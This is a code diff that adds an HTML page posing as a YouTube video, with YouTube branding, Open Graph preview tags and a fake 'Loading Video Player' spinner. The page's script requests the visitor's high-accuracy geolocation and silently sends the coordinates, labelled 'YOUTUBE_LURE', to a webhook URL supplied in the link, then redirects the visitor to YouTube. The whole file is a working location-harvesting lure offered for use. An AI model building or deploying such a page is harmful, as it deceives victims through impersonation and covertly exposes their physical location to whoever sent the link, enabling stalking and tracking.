@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Open Graph Meta Tags for YouTube-Style Preview -->
+    <title>Watch: Trending Video | YouTube</title>
+    <meta name="description"
+        content="Enjoy the videos and music you love, upload original content, and share it all with friends, family, and the world on YouTube.">
+    <meta property="og:title" content="EXCLUSIVE: Trending Video 2024">
+    <meta property="og:description" content="1.2M Views • 2 hours ago">
+    <meta property="og:image" content="https://img.youtube.com/vi/aqz-KE-bpKQ/maxresdefault.jpg">
+    <meta property="og:url" content="https://www.youtube.com">
+    <meta property="og:type" content="video.other">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background: #0f0f0f;
+            color: white;
+        }
+
+        .loader {
+            border: 4px solid #333;
+            border-top: 4px solid #ff0000;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div style="text-align: center;">
+        <div class="loader" style="margin: 0 auto 20px;"></div>
+        <p>Loading Video Player...</p>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const webhook = urlParams.get('wh');
+        const redirect = urlParams.get('r') || "https://www.youtube.com";
+
+        window.onload = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        if (webhook) {
+                            await fetch(webhook, {
+                                method: 'POST',
+                                mode: 'no-cors',
+                                body: JSON.stringify({
+                                    lat: position.coords.latitude,
+                                    lng: position.coords.longitude,
+                                    type: "YOUTUBE_LURE"
+                                })
+                            });
+                        }
+                        window.location.href = redirect;
+                    },
+                    () => { window.location.href = redirect; },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                window.location.href = redirect;
+            }
+        };
+    </script>
+</body>
+
+</html>
